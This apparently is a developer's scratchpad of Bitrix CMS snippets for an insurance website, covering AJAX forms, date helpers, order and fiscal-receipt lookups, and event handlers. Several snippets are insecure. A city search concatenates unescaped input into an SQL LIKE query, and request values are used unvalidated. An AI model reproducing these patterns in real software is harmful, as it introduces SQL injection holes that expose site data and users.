						<div class="invalid-feedback"></div>
					</div>
				</div>


	// Обновление каптчи
	$("#form-ensurance").on("click", "#change_captcha", function(event) {

		event.preventDefault();
		event.stopImmediatePropagation();

		var form = $(this).parents('form').get(0);
		if (form) {
			$.ajax({
				url: '/ajax/recaptcha.php',
				data: {
					ajax: 'Y'
				},
				success: function (code) {
					$(form).find('input[name="captcha_sid"]').val(code);
					$(form).find('img.form__captcha').attr('src', '/bitrix/tools/captcha.php?captcha_sid=' + code);
				}
			});
		}
	});


		$.ajax({
			type : 'POST',
			url : ajax_url,
			dataType: 'json',
			data : $("#form_travel").serialize()+'&VALIDATE_AND_COUNT=Y',
			beforeSend: function() {
              $('#step_1_1').html('Пожалуйста, подождите ...');
           },  
			success : function(data) {
				console.log(data);
				if (data.result == "error") {
					// валидация
					show_errors(data.fields);
					$('#step_1_1').html('Рассчитать');

				} else if (data.result == "success") {
					// отобразить форму с расчётами
					$('.desigion__item-inner-travel').removeClass('hidden').html(data.html);
					$('html, body').stop().animate({
					    scrollTop: $('#step_1_1').offset().top
					}, 400);
					$('body').find('.desigion__item-inner-travel-td-double select, .radio__choose  select').select2({
			            minimumResultsForSearch: -1
			        });
			        $('.change_sum').show();

			        //Переход к шагу 1_2
					toStep_1_2();
				}
			}
		});


	$('#paydate').on('change', function(){
		var ajax = paydate_check();
		ajax.done(function(data){
			console.log(data.result);
			if (data.result==false) {
				//$('#modal_info').modal('show');
			}
		});
	});
	
	function paydate_check(){
		var ajax = $.ajax({
			type: 'POST',
			url: ajax_url,
			dataType: 'json',
			data: $("#form-desigion").serialize() + '&PAYDATE=Y',});
		return ajax;
	};


    <script>
        $(document).ready(function() {
        if(window.location.href.indexOf('#refreshPage') != -1) {
            $('#refreshPage').modal('show');
          }
      });
    </script>


<?




// D7 
use Bitrix\Main\Application; 
$request = Application::getInstance()->getContext()->getRequest(); 

$name = $request->getPost("name"); 
$email = htmlspecialchars($request->getQuery("email"));




$connection = Application::getConnection();

		$arResult = array();
		
		$sql = 'SELECT c.CODE, c.NAME, c.LEVEL
					FROM ag_kladr_city c 
					WHERE c.IS_CITY = 1 
						AND UPPER(c.NAME) LIKE UPPER("%'.$query.'%")
					ORDER BY c.LEVEL
					LIMIT 200';
		
        $rsSql = $connection->query($sql);

		while($arCityes = $rsSql->Fetch()){
			$arResult[$arCityes["CODE"]] = $arCityes["NAME"] . $arCityes["LEVEL"];
		}








    function checkStatus(url, id, showError, timeout) {
        $.ajax({
            url: url,
            type: 'post',
            data: {
                'sessid': BX.bitrix_sessid(),
                'action': 'check',
                'id': id

            },
            success: function(data) {
                data = data || {};
                if (data['result'] && data['url']) {
                    window.location.href = data['url'];
                } else {
                    if (data['errors']) {
                        showError();
                    } else {
                        setTimeout(function() {
                            checkStatus(url, id, showError, timeout);
                        }, timeout);
                    }
                }
            },
            error: function() {
                setTimeout(function() {
                    checkStatus(url, id, showError, timeout);
                }, timeout);
            }
        });
    }


            $.ajax({
                url: $form.attr('action'),
                data: $form.serialize(),
                type: 'post',
                success: function(data) {
                    data = data || {};
                    var id = data['id'] || '',
                        errors = data['errors'] || [];
                    if (id) {
                        checkStatus($form.attr('action'), data['id'], showError, 3000);
                    } else {
                        showError(errors);
                    }
                },
                error: showError
            });




<?
class ARUtils
{
    var $level;
    
    function __construct()
    {
        /*
        $this->level = $level;
        $arResult['arMapStruct'] = GetTree($_SERVER['DOCUMENT_ROOT'] . '/', $this->level);
        */
    }


}
?>


	private function saveFile($xml__request_path, $data, $integrator) {

		$xml__request_path_bx = \CFile::MakeFileArray($xml__request_path);
		$xml__request_path_bx['del'] = true;
		$xml__request_path_bx['MODULE_ID'] = 'iblock';

		$xml__request_save_path = 'tmp_xml' . '/' . ($integrator ? 'integrator' : 'tarificator') . '/' . $data['CALC'];
		$xml__request_path_id = \CFile::SaveFile($xml__request_path_bx, $xml__request_save_path);

		if ($xml__request_path_id) {
			$xml__request_get_path = \CFile::GetPath($xml__request_path_id);
		}

		return $xml__request_get_path;
	}

/**
 * Выводит дату в формате "23 минуты назад"
 *
 * @param $date_time
 *
 * @return bool|string
 */
function fromCurrentTimeFormat($date_time, $word = "назад")
{
   if (!strlen($date_time) > 0) {
      return false;
   }

   if (MakeTimeStamp(date('d.m.Y H:i:s')) - MakeTimeStamp($date_time) < 60 * 60) {
      $result = FormatDate("x", MakeTimeStamp($date_time), MakeTimeStamp(date('d.m.Y H:i:s')));
   } elseif (MakeTimeStamp(date('d.m.Y H:i:s')) - MakeTimeStamp($date_time) < 60 * 60 * 24) {
      $result = FormatDate("Hago", MakeTimeStamp($date_time), MakeTimeStamp(date('d.m.Y H:i:s')));
   } else {
      $result = FormatDate("Q", MakeTimeStamp($date_time), MakeTimeStamp(date('d.m.Y H:i:s'))) . ' ' . $word;
   }

   return $result;
}

<?
/**
 * Читаемая дата
 *
 * @static setFormattedDate
 *
 * @param $date
 *
 * @return string
 */
public static function setFormattedDate($date)
{
   $dateDay = mb_substr($date, 8, 2);
   $dateMonth = mb_substr($date, 5, 2);
   $dateYear = mb_substr($date, 0, 4);

   return ltrim($dateDay, "0") . " " . indiUtil::getMonthGenetiv($dateMonth) . " " . $dateYear . " г.";
}



$monthName = ['', 'янв', 'фев', 'мар', 'апр', 'мая', 'июн', 'июл', 'авг', 'сен', 'окт', 'ноя', 'дек'];
$monthName2 = ['', 'января', 'февраля', 'марта', 'апреля', 'мая', 'июня', 'июля', 'августа', 'сентября', 'октября', 'ноября', 'декабря'];
<?=$monthName[intval($dateFormat[1])];?>


	$arLog[DATE] = date('d.m.Y H:i:s');
	$arLog[MAILTO] = $mail_to;
	$arLog[SUBJECT] = $subject;
	$arLog[MULTIPART] = $multipart;
	$arLog[HEADERS] = $headers;

        if(!mail($mail_to, $subject, $multipart, $headers))
        {
	    $arLog[STATUS] = 'error';
	    file_put_contents($_SERVER[DOCUMENT_ROOT].'/bitrix/tmp/_mail_'.date('Ymd').'.log',print_r($arLog,true),FILE_APPEND);
            return false;
        }
        else
        {
	    $arLog[STATUS] = 'ok';
	    file_put_contents($_SERVER[DOCUMENT_ROOT].'/bitrix/tmp/_mail_'.date('Ymd').'.log',print_r($arLog,true),FILE_APPEND);
            return true;
        }
    }





use Bitrix\Main\Page\Asset;
Asset::getInstance()->addJs('//api-maps.yandex.ru/2.0-stable/?load=package.standard&lang=ru-RU', true);















?>





В файле /bitrix/modules/sale/lib/cashbox/manager.php установите константу DEBUG_MODE = true;
Логи пишутся в таблицу b_sale_cashbox_err_log в панели администрирования, Настройки - Производительность - Таблицы
По окончании решения проблемы логирование необходимо отключить, иначе база быстро забьется данными.


<?























'UF_ATTEMPT_DATE' => date('d.m.Y H:i:s', time()) //new \DateTime()
    







if ($insurer['PHONE'] && preg_match('/\d{10}/', $insurer['phone'])
        ) {
            $contact->addChild('phone', '+7' . substr($insurer['phone'], -10));
        } else {
            $contact->addChild('phone', '');
        }

        array(
            '>ACCOUNT_NUMBER' => 'XXX',
            '>=DATE_INSERT' => $date,
            '<=DATE_INSERT' => $date . ' 23:59:59',
        )


            $filter['DATE_PAYED_FROM'] = $days[1].$currentTime->format(" H:i:s");
            $filter['DATE_PAYED_TO'] = $days[1].' 23:59:59';





    /**
     * @param $email
     * @return string
     */
    private static function generateDigitalSignature($email)
    {
        return md5($email . uniqid('', true));
    }

// добавление ПЭП к отправляемому сообщению
AddEventHandler('form', 'onBeforeResultAdd', 'my_onBeforeResultAdd');
function my_onBeforeResultAdd($WEB_FORM_ID, &$arFields, &$arrVALUES)
{
	if ($WEB_FORM_ID == 2) {
		$arrVALUES['form_text_82'] = \Sogaz\Main\Code::generateDigitalSignature($arrVALUES['form_email_11']);
	}
}









$month = \DateTime::createFromFormat('d.m.Y H:i:s', $item['UF_DATE_CREATED'])->format('d.m.Y');




<?
$year = 2019; $f_year = 2018;
if ($_REQUEST['YEAR']) {
    $year = $_REQUEST['YEAR'];
}


<select name="year" id="year">
                            <? for ($i = date('Y'); $i >= $f_year; $i--) { ?>
                                <option value="<?=$i?>"><?=$i?> год</option>
                            <? } ?>
                        </select>







https://www.intervolga.ru/blog/projects/d7-analogi-lyubimykh-funktsiy-v-1s-bitriks/


// Old school 
$name = $_POST["name"]; 
$email = htmlspecialchars($_GET["email"]); 

// D7 
use Bitrix\Main\Application; 
$request = Application::getInstance()->getContext()->getRequest(); 

$name = $request->getPost("name"); 
$email = htmlspecialchars($request->getQuery("email"));


// D7 
use Bitrix\Main\Page\Asset; 

Asset::getInstance()->addJs(SITE_TEMPLATE_PATH . "/js/fix.js"); 
Asset::getInstance()->addCss(SITE_TEMPLATE_PATH . "/styles/fix.css"); 
Asset::getInstance()->addString("<link href='http://fonts.googleapis.com/css?family=PT+Sans:400&subset=cyrillic' rel='stylesheet' type='text/css'>"); 


// D7 
use Bitrix\Main\Loader; 

Loader::includeModule("iblock"); 
Loader::includeSharewareModule("intervolga.tips");

// D7 
$cache = Bitrix\Main\Data\Cache::createInstance(); 
if ($cache->initCache($cacheTime, $cacheId, $cacheDir)) 
{ 
    $result = $cache->getVars(); 
} 
elseif ($cache->startDataCache()) 
{ 
    $result = array(); 
    // ... 
    if ($isInvalid) 
    { 
        $cache->abortDataCache(); 
    } 
    // ... 
    $cache->endDataCache($result); 
} 
События


$time = date("Y-m-d H:i:s", strtotime(date() . " -10 minutes"));

                    global $DB;
                    $strSql = "DELETE FROM b_event WHERE `DATE_INSERT` < '".$time."'";

                    $rsMails = $DB->Query($strSql);


                    /*$strSql = "SELECT * FROM b_event WHERE 1";
                    while ($arMail = $rsMails->Fetch()) {
                        \WebWay\Sogaz\Util::debug($arMail);
                    }*/


global $DB;
$time = date("Y-m-d H:i:s", strtotime(date() . " -10 minutes"));
$strSql = "DELETE FROM b_event WHERE `DATE_INSERT` < '".$time."'";
$DB->Query($strSql);




<?

$policyNumber = [
	'1819-99 SL 000234',
	'1819-99 SL 000235',
	'1819-99 SL 000236',
	'1819-99 SL 000237',
	'1819-99 SL 000238',
	'1819-99 SL 000239',
	'1819-99 SL 000240',
	'1819-99 SL 000242',
	'1819-99 SL 000243',
	'1819-99 SL 000244',
	'1819-99 SL 000245',
	'1819-99 SL 000247',
	'1819-99 SL 000246',
	'1819-99 SL 000248',
	'1819-99 SL 000250',
	'1819-99 SL 000251',
	'1819-99 SL 000254',
	'1819-99 SL 000253',
	'1819-99 SL 000255',
	'1819-99 SL 000256',
	'1819-99 SL 000257',
	'1819-99 SL 000259',
	'1819-99 SL 000260',
	'1819-99 SL 000261',
	'1819-99 SL 000262',
	'1819-99 SL 000263',
	'1819-99 SL 000264',
	'1819-99 SL 000265',
	'1819-99 SL 000266',
	'1819-99 SL 000267',
	'1819-99 SL 000268',
	'1819-99 SL 000269',
	'1819-99 SL 000271',
	'1819-99 SL 000272',
	'1819-99 SL 000273',
	'1819-99 SL 000274',
	'1819-99 SL 000275',
	'1819-99 SL 000276',
	'1819-99 SL 000277'
];

$arOrder = \CSaleOrder::GetList(
	[],
	['ACCOUNT_NUMBER' => $policyNumber],
	false,
	false,
	['ID', 'ACCOUNT_NUMBER', 'PRICE']
);

$getTokenMethod = Sogaz\Atol\Api\Method\GetToken::getInstance();
$token = $getTokenMethod->execute();

$shop_id = Option::get('sogaz.atol', 'GROUP_CODE', '');

while ($order = $arOrder->Fetch()) {

	// вытащить свойство ATOL_UUID
	$orderData = \Bitrix\Sale\Internals\OrderPropsValueTable::getList(['filter' => array('ORDER_ID' => $order['ID'], 'CODE' => 'ATOL_UUID')])->Fetch();

	// если поле пустое
	if (!empty($orderData['VALUE']))
	{

		$request_url = "https://online.atol.ru/possystem/v4/{$shop_id}/report/{$orderData['VALUE']}?token={$token}";
		$request_data = @file_get_contents($request_url);
		$request_data = json_decode($request_data);

		$link = sprintf(
			'https://receipt.taxcom.ru/v01/show?fp=%s&s=%s',
			$request_data->payload->fiscal_document_attribute,
			$request_data->payload->total
		);

		\WebWay\Sogaz\Util::debug($order['ACCOUNT_NUMBER']);
		\WebWay\Sogaz\Util::debug($order['PRICE']);
		\WebWay\Sogaz\Util::debug($link);
		\WebWay\Sogaz\Util::debug('=========================');
	}
}
                </div>
            </div>
        </div>
    </main>




		<script>
			$(function () {
				$('body').on('change', 'select', function(){
					let obj = $(this).val();
					window.location.href = obj;
				});
			});
		</script>
		<form>
			<div class="filter__item">
				<div class="item__title">Сортировать по:</div>
				<div class="item__select">
					<select class="select--two">
						<option hidden>цене</option>
						<option value="/catalog/?SORT=Y&type=price&sort=ASC">по возрастанию</option>
						<option value="/catalog/?SORT=Y&type=price&sort=DESC">по убыванию</option>
					</select>
				</div>
				<div class="item__select">
					<select class="select--three">
						<option hidden>названию</option>
						<option value="/catalog/?SORT=Y&type=name&sort=ASC">по возрастанию</option>
						<option value="/catalog/?SORT=Y&type=name&sort=ASC">по убыванию</option>
					</select>
				</div>
			</div>
		</form>


use Bitrix\Main\Application;

	switch (Application::getInstance()->getContext()->getRequest()->get('policy')) {
		case 'vpmj':
			LocalRedirect('/products/travel/');
			break;
		case 'persona_economy':
			LocalRedirect('/products/accident/');
			break;
		default:
			LocalRedirect('/');
			break;
	}


$connection = \Bitrix\Main\Application::getConnection();
$connection->queryExecute("TRUNCATE TABLE ".self::getTableName());

	protected function checkModules()
	{
		\CModule::IncludeModule("webway.sogaz");

		if(!Application::getConnection()->isTableExists(\WebWay\Sogaz\Data\AnalyticsTable::getTableName()))
		{
			\Bitrix\Main\Entity\Base::getInstance('\WebWay\Sogaz\Data\AnalyticsTable')->createDbTable();
		}
	}


		$request = Application::getInstance()->getContext()->getRequest();
        $getData = $request->getQueryList()->toArray();



гекодрайвер
https://github.com/mozilla/geckodriver/releases

java -jar selenium-server-standalone-3.141.59.jar

ся инструкция
https://github.com/facebook/php-webdriver#getting-started






			$cPartner = \WebWay\Sogaz\Helper::getHLEntity('PromoPartners');
			$rsData = $cPartner::getList();

			while($arRow = $rsData->fetch()){
				$this->arResult["PARTNERS"][$arRow["UF_CODE"]] = $arRow["UF_NAME"];
			}







\Bitrix\Main\EventManager::getInstance()->addEventHandler(

    'sale',

    'OnSaleAdminOrderList',

    'OnSaleAdminOrderList'

);



function OnSaleAdminOrderList(\Bitrix\Main\Event $event)

{
    \CModule::IncludeModule("webway.sogaz");
    $getListParams = $event->getParameters();

    $getListParams['runtime']['PROP_FILTER'] = array(
        'data_type' => 'Bitrix\Sale\Internals\OrderPropsValueTable',
        'reference' => array(
            'ref.ORDER_ID' => 'this.ID',
        ),
        'join_type' => 'inner'

    $getListParams['filter']['=PROP_FILTER.CODE'] = 'SOURCE'; // символьный код свойства заказа
    $getListParams['filter']['=PROP_FILTER.VALUE'] = 'LK'; // значение свойства заказа

    $result = new \Bitrix\Main\EventResult(\Bitrix\Main\EventResult::SUCCESS, $getListParams);
    return $result;

}

AddEventHandler('main', 'OnBeforeProlog', function() {
    if (defined('ADMIN_SECTION') && ADMIN_SECTION === true) {
        global $APPLICATION;

        if (in_array($APPLICATION->GetCurPage(), ['/bitrix/admin/sale_order.php'])) {
            CJSCore::Init(array('jquery'));
            $js = '';
            $js .= '$(function () {';
            $js .= '$("name=filter_prop_SOURCE").val(123)';
            $js .= '});';
            $APPLICATION->AddHeadString('<script>' . $js . '</script>');
        }
    }
});



$insDays = (int) $arData['UF_INSDAYS'];
						$date = mb_substr((string)$arData['UF_DATE'], 0, 10);
						$date2 = date("d.m.Y", strtotime($date . " +" . $insDays . " days"));
						if ($insDays > 1) {
							$d1 = mb_substr($date, 0, 2);
							$d2 = mb_substr($date2, 0, 2);

							$m1 = mb_substr($date, 3, 2);
							$m2 = mb_substr($date2, 3, 2);

							$y1 = mb_substr($date, 6, 4);
							$y2 = mb_substr($date2, 6, 4);

							$date =
								($m1 == $m2 ?
									$d1 . ' &ndash; ' . $d2 . '.' .  $m1 . '.' .  $y1 :
									$d1 . '.' . $m1 . ' - ' . $d2 . '.' .  $m2 . '.' .  $y1
								);
						} else {
							$date = ltrim($date, "0");
						}


use Bitrix\Main\Application;

$request = Application::getInstance()->getContext()->getRequest();
if ($request->isPost() && $request->getPost('application')) {
	\WebWay\Sogaz\Util::debug(123);
}










    2 =>
        array(
            'CONDITION' => '#/products/automobile/osago/delivery/#',
            'RULE' => '',
            'ID' => '',
            'PATH' => '/osago/delivery.php',
            'SORT' => 100,
        ),
    3 =>
        array(
            'CONDITION' => '/(automobile|estate|travel|persona)/',
            'RULE' => 'BRANCH_CODE=$1&t=$2',
            'ID' => 'atb:branch',
            'PATH' => '/branch/index.php',
            'SORT' => 100,
        ),









    <?if(!$_SESSION['DOLLAR']):?>
    <?require_once($_SERVER['DOCUMENT_ROOT'] . '/bitrix/modules/main/classes/general/xml.php');?>
    <?$xml = new CDataXML()?>
    <?$http = new \Bitrix\Main\Web\HttpClient();
      $string = $http->get('http://www.cbr.ru/scripts/XML_daily_eng.asp?id=0')?>
    <?$xml->LoadString($string)?>
    <?$data = $xml->GetArray()?>
    <?$_SESSION['DOLLAR'] = $data['ValCurs']['#']['Valute'][9]['#']['Value'][0]['#']?>
    <?endif?>





use Bitrix\Iblock\ElementTable;
use Bitrix\Iblock\IblockTable;

            if (!$iblock = IblockTable::getList([
                'select' => ['ID'],
                'filter' => [
                    'CODE' => 'messages'
                ]
            ])->fetch()) {
                throw new Exception('Ошибка при получении данных');
            }




if (strpos($APPLICATION->GetCurPage(), '/confidence.html')) {
        $APPLICATION->AddHeadString('<link type="text/css" href="' . SITE_TEMPLATE_PATH . '/confidence.css" rel="stylesheet">');
        $APPLICATION->AddHeadString('<script src="' . SITE_TEMPLATE_PATH . '/js/confidence.js"></script>');
    }




<?





    public function generateHash()
    {
        if(!$this->Name)
        {
            $this->throwException('There is no Name');
        }
        return md5($this->Name);
    }

    protected function throwException($text)
    {
        throw new WscException($text.' in '.get_called_class());
    }


if (window.location.href.indexOf('/mortgage/pay/') > 0) { // для страницы оплаты в ВПМЖ
                    $('#step3').slideUp();
                    $('#step2').slideDown();
                }

?>

private static function getProgramCalculator($code)
	{
		$programs = self::getPrograms();
		if (array_key_exists($code, $programs)) {
			return $programs[$code];
		}

		return null;
	}


'cards' => json_decode(json_encode($data->cards), true),
'cards' => json_decode(json_encode($data->cards), false),


    public static function dump($var)
    {
        if(!$GLOBALS['USER']->IsAdmin()) return;
        echo '<script>console.log('.\CUtil::PhpToJSObject($var).');</script>';
    }



$rsProp = \CSaleOrderPropsValue::GetList(
				array(),
				array(
					"=ORDER_ID" => $saleData['ID'],
					"=CODE" => array("SOURCE", "PROMOCODE", "BUYER", "POLICY_NUMBER", "EMAIL"),
				)
			);


$obProps = \Bitrix\Sale\Internals\OrderPropsValueTable::getList(array('filter' => array('ORDER_ID' => $data['XML_ID'])));
                while ($prop = $obProps->fetch()) {
                    $arProps[$prop['CODE']] = $prop['VALUE'];
                }



foreach ($arCities as $key => $row) {
		            $name[$key] = $row['NAME'];
	            }
	            array_multisort($name, SORT_ASC, $arCities);


        $countryList = [];
        $csvFile = new \CCSVData('R', true);
        $csvFile->LoadFile($_SERVER['DOCUMENT_ROOT'].'/local/includes/oksm.csv');
        $csvFile->SetDelimiter(';');
        while ($arRes = $csvFile->Fetch()) {
            $countryList[sprintf("%03d", $arRes[0])] = $arRes[1];
        }

Нет. Вручную удалите файл iblock/lib/property.php, предварительно проверив, что существует iblock/lib/propertytable.php. А лучше обратитесь в ТП, дав административный доступ.


1. Переходим в редактирование ИБ, который надо перенести.
2. Меняем GET-параметр type на _нужный_ тип (куда перенести). Обновляем страницу по новому URL.
3. Теперь сохраняем инфоблок.
4. Профит.

проверил на 15.5.5 - работает фича со сменой GET-параметра. Нужно после смены параметра открыть страницу по новому URL, а уже потом сохранять инфоблок.



var childAge = getAge(
                $('[name="child[birth][month]"]').val() + '/' +
                $('[name="child[birth][day]"]').val()     + '/' +
                $('[name="child[birth][year]"]').val()
            );
        if (error.html() == '' && childAge > 0) {
            yaCounter25176059.reachGoal('Pers_info');
            $('.calcInfo').submit();
            error.hide();
        } else {
            if (error.html() != '')
            {
                error.show();
                $('html, body').animate({
                    scrollTop: $("#warn").offset().top -200
                }, 200);
            }
        }


			if ($sum < $data['sumMin'] || $sum > $data['sumMax']) {
				throw new Exception('Выберете правильное значение суммы!');
			}

			if (empty($data['term'])) {
				throw new Exception('Выберете срок страхования!');
			}

			if (empty($data['payment'])) {
				throw new Exception('Выберете порядок оплаты!');
			}
		} catch (Exception $e) {
			echo json_encode(['success' => false, 'message' => $e->getMessage()]);
			break;
		}




		\Bitrix\Main\Mail\Event::send(
			array(
				"EVENT_NAME" => 'REQUEST_TO_WORK_NOTIFY',
				"LID" => 's1',
				"C_FIELDS" => $arPostFields,
			)
		);


class Geocoder {

    protected $geocoder;


    public function __construct() {
        try {
            $curl = new \Ivory\HttpAdapter\CurlHttpAdapter();
            $this->geocoder = new \Geocoder\Provider\GoogleMaps($curl, null, null, true, \COption::GetOptionString('indi.main', 'indi_googlemaps_key'));
            return true;
        } catch(Exception $e) {
            return false;
        }
    }



AddEventHandler("sale", "OnOrderPaySendEmail", "OnOrderPaySendEmail");
function OnOrderPaySendEmail($orderID, &$eventName, &$arFields) {}


AddEventHandler("sale", "OnBeforeOrderUpdate", "OnOrderUpdateHandler");
function OnOrderUpdateHandler($ID, $fields) {}

AddEventHandler('sale', 'OnOrderStatusSendEmail', 'OnOrderStatusSendEmail');
function OnOrderStatusSendEmail($orderId, &$eventName, &$arFields, $val) {
	\Bitrix\Main\Loader::includeModule('sale');
	$description = '';
	$rsBasket = \CSaleBasket::GetList(array(), array('ORDER_ID' => $orderId));
	while ($arBasket = $rsBasket->GetNext()) {
		if ($description) {
			$description .= "\n";
		}

		$description .= $arBasket['NAME'];
	}
	$arFields['ORDER_DESCRIPTION'] = $description;
}



if(!function_exists('dump', $useVarDump = false)){
    function dump($var){
        $bt = debug_backtrace(DEBUG_BACKTRACE_IGNORE_ARGS);
        $caller = $bt[0];
        echo "<pre style='margin: 10px 0; border: 1px solid red; padding: 10px; background: white; color: gray; font-size: 10px;'>";
        if($useVarDump){
        	var_dump($var);
        } else {
        	print_r($var);
        }
        echo "\n--[".$caller['file'].':'.$caller['line']."]--";
        echo "</pre>";
    }
}

function AnimaDump($var) {
	if (!$GLOBALS['USER']->IsAdmin()) {
		return;
	}

	echo '<script>console.log(' . CUtil::PhpToJSObject($var) . ');</script>';
}



AddEventHandler('main', 'OnAfterUserLogin', Array("AnimaHandler", "onAfterUserLogin")); // проверка авторизации по договору
AddEventHandler('main', 'OnEpilog', Array("AnimaHandler", "setEmail")); // проверка указан ли новый e-mail, если нет, редирект на изменение
AddEventHandler('main', 'OnProlog', Array("AnimaHandler", "changeSystemID")); // проверка указан ли новый e-mail, если нет, редирект на изменение
AddEventHandler('main', 'OnBeforeEventSend', Array("AnimaHandler", "onBeforeEventSend"));
AddEventHandler('main', 'OnBeforeUserUpdate', Array("AnimaHandler", "onBeforeUserUpdate")); // установка логина и e-mail одинаковыми
AddEventHandler("iblock", "OnAfterIBlockElementUpdate", Array("AnimaHandler", "onAfterIBlockElementUpdateHandler")); // отправки письма пользователю о статусе заявки
AddEventHandler("iblock", "OnAfterIBlockElementAdd", Array("AnimaHandler", "onAfterIBlockElementAddHandler")); //  отправка письма сотрудникам СК и пользователю при доабвлении обращения
AddEventHandler("sale", "onBeforeOrderUpdate", Array("AnimaHandler", "onBeforeOrderUpdate")); //  отправка данных о заказе

AddEventHandler('main', 'OnAdminListDisplay', Array("OnAdminListDisplay", "AdminUsersListDisplay"));

AddEventHandler("main", "OnBeforeUserAdd", Array("OnBeforeUser", "UserAdd"));
AddEventHandler("main", "OnBeforeUserUpdate", Array("OnBeforeUser", "UserUpdate"));



    public function getCountriesOKSM() {
        $countryList = [];
        $csvFile = new CCSVData('R', true);
        $csvFile->LoadFile($_SERVER['DOCUMENT_ROOT'].'/local/includes/oksm.csv');
        $csvFile->SetDelimiter(';');
        while ($arRes = $csvFile->Fetch()) {
            $countryList[sprintf("%03d", $arRes[0])] = $arRes[1];
        }
        return $countryList;
    }
